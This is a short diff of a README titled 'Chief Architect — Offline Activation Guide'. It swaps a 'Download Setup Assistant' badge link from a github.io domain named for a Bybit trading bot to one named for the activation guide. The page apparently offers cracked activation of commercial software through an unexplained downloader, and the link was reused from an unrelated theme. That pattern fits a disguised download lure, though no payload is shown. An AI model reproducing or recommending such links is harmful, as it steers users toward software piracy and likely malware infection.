@@ -1,6 +1,6 @@
 # Chief Architect — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://bybit-trading-bot-ai-elite.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://chief-architect-activation-guide.github.io/.github)
 
 ## ⚙️ How to Use
 
